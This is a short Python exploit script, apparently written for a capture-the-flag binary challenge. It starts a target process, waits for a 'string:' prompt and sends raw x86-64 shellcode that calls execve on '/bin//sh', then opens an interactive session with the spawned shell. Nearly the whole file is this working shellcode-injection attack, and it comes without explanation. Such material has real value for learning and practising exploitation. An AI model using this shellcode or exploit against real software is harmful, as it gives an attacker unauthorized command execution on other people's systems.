import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
data = p.readuntil('string:')
p.sendline("\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\xEB\x04\x90\x90\x90\x90\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05")

p.interactive()
